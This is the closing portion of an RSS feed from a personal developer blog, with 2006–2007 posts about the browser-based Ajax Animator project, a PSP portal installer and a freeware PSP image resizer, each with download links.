      <description>&lt;p&gt;Well, i’m adding lot’s of new stuff (as always)&lt;/p&gt;
&lt;p&gt;New things:
Improved UI (no seriously)
Now supports tweening of lines (should have been there since the start)
All code is loaded on init (no ajax unless needed)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Features</title>
      <link>http://antimatter15.com/2007/09/new-features/</link>
      <pubDate>Sat, 29 Sep 2007 08:37:51 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/09/new-features/</guid>
      <author></author>
      <description>&lt;p&gt;I’m just doing some size reduction, and ui improvement now. There has been some preliminary support for IE, and also a rewrite of the tweening engine to support lines.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>More Information</title>
      <link>http://antimatter15.com/2007/08/more-information/</link>
      <pubDate>Fri, 10  Aug 2007 23:27:15 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/08/more-information/</guid>
      <author></author>
      <description>&lt;p&gt;For Some Statistics and stuff go here:
&lt;a href=&quot;http://www.ohloh.net/projects/5465&quot;&gt;http://www.ohloh.net/projects/5465&lt;/a&gt;
For Source Code:
&lt;a href=&quot;http://code.google.com/p/ajaxanimator&quot;&gt;http://code.google.com/p/ajaxanimator&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Alpha</title>
      <link>http://antimatter15.com/2007/05/new-alpha/</link>
      <pubDate>Thu, 24 May 2007 21:51:46 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/05/new-alpha/</guid>
      <author></author>
      <description>&lt;p&gt;Try out the unstable version at &lt;a href=&quot;http://antimatter15.com/2007/unstable&quot;&gt;http://antimatter15.110mb.com/unstable&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;By unstable, I mean it has lots of features that will not work- Not, however, that it will have a higher of a chance of crashing your web browser than anything else on the internet.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator</title>
      <link>http://antimatter15.com/2007/05/ajax-animator/</link>
      <pubDate>Sun, 20 May 2007 05:21:23 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/05/ajax-animator/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Ajax Animator&quot;  src=&quot;/articles/2007/Ajax%20Animator/logo.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Ajax Animator&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Gmail revolutionized email by offering a web based equivalent to Outlook and Thunderbird, except this was completely web based. No more Installing. So did Google Docs and Spreadsheets, or Zoho office, or etc, they had entirely free and web based clones of Microsoft Office or OpenOffice. Or Microsoft Windows, then there is Linux and now there is desktoptwo eyeos and youos.
I think of it as a development cycle, somebody makes something that is expensive, then something free, then something entirely Web based.
Now, what about Flash. According to adobe, 97% of all people who browse the Internet have flash player installed. By far larger than the amount of people who have outlook, thunder bird, Microsoft office, or Openoffice installed. Flash also accounts for a large percent of So why isn’t there a freeware open source replacement to this $400 software? There are though, UIRA, F4L, QFlash, KDSFlash, and more, but they are early in development. So when is the third generation web 2.0 equivalent for animation software coming? This is what I want to develop.
This is a project to make an open-source browser based Flash Authoring system.&lt;/p&gt;
&lt;p&gt;Please post comments in the shout box.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>PSP Portal Installer Beta 1 Released!</title>
      <link>http://antimatter15.com/2006/09/psp-portal-installer-beta-1-released/</link>
      <pubDate>Sat, 02 Sep 2006 07:50:29 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2006/09/psp-portal-installer-beta-1-released/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://s4.quicksharing.com/v/256482/Portal_Installer_Beta_1.zip.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s4.quicksharing.com/v/256482/Portal_Install&lt;wbr /&gt;er_Beta_1.zip.html&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;this is a simple program that can automatically unzip and install portals.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Automatic PSP drive memorization&lt;/li&gt;
&lt;li&gt;Easy Step By Step Directions&lt;/li&gt;
&lt;li&gt;Supports Root and Common folder installs&lt;/li&gt;
&lt;li&gt;Supports zip portals&lt;/li&gt;
&lt;li&gt;Supports uncompressed folders&lt;/li&gt;
&lt;li&gt;quick&lt;/li&gt;
&lt;li&gt;easy&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>My Freeware Image Resizer</title>
      <link>http://antimatter15.com/2006/08/my-freeware-image-resizer/</link>
      <pubDate>Wed, 23  Aug 2006 06:19:24 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2006/08/my-freeware-image-resizer/</guid>
      <author></author>
      <description>&lt;p&gt;Coded in VB.NET (requires .net framework 2.0 to run)
PM me 4 the source code&lt;/p&gt;
&lt;hr size=&quot;2&quot; width=&quot;100%&quot; /&gt;

&lt;p&gt;Completly free not a demo or trial&lt;/p&gt;
&lt;hr size=&quot;2&quot; width=&quot;100%&quot; /&gt;

&lt;p&gt;&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;
&lt;a href=&quot;http://s2.quicksharing.com/v/1776353/ImageResizer.exe.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;http://s2.quicksharing.com/v/1776353/ImageResizer.&lt;wbr /&gt;exe.html&lt;/a&gt;&lt;/p&gt;
&lt;hr size=&quot;2&quot; width=&quot;100%&quot; /&gt;

&lt;p&gt;Features&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fixed Bugs in Saving to the psp&lt;/li&gt;
&lt;li&gt;Fixed Bugs in saving to the pc&lt;/li&gt;
&lt;li&gt;Added Image Flipping&lt;/li&gt;
&lt;li&gt;Added Image Rotating&lt;/li&gt;
&lt;li&gt;Added splash screen&lt;/li&gt;
&lt;li&gt;This is a freeware PSP image resizer it Includes;&lt;/li&gt;
&lt;li&gt;Freeware No Registration Necessary&lt;/li&gt;
&lt;li&gt;No Install Necessary&lt;/li&gt;
&lt;li&gt;LightWeight (only 48 kb Less than most flash games)&lt;/li&gt;
&lt;li&gt;Dosent Cut Off Sides Changes the aspect ratio&lt;/li&gt;
&lt;li&gt;One click Resizing to 480/272 pixels&lt;/li&gt;
&lt;li&gt;Built in Direct Output To PSP Images&lt;/li&gt;
&lt;li&gt;Easy To Use&lt;/li&gt;
&lt;li&gt;I made it&lt;/li&gt;
&lt;li&gt;1 click resize to psp&lt;/li&gt;
&lt;li&gt;custom resizing&lt;/li&gt;
&lt;li&gt;image preview&lt;/li&gt;
&lt;li&gt;easy to use&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Large amount of supported extentions include&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;jpg&lt;/li&gt;
&lt;li&gt;bmp&lt;/li&gt;
&lt;li&gt;png&lt;/li&gt;
&lt;li&gt;gif&lt;/li&gt;
&lt;li&gt;wmf&lt;/li&gt;
&lt;li&gt;tiff&lt;/li&gt;
&lt;/ul&gt;
&lt;hr size=&quot;2&quot; width=&quot;100%&quot; /&gt;

&lt;h3 id=&quot;screenshots-of-verion-1&quot;&gt;SCREENSHOTS of verion 1&lt;/h3&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2006/Image%20Resizer/ImageResizer.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2006/Image%20Resizer/ImageResizer6.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2006/Image%20Resizer/ImageResizer5.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2006/Image%20Resizer/ImageResizer4.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2006/Image%20Resizer/ImageResizer3.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2006/Image%20Resizer/ImageResizer2.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
</description>
    </item>
  </channel>
</rss>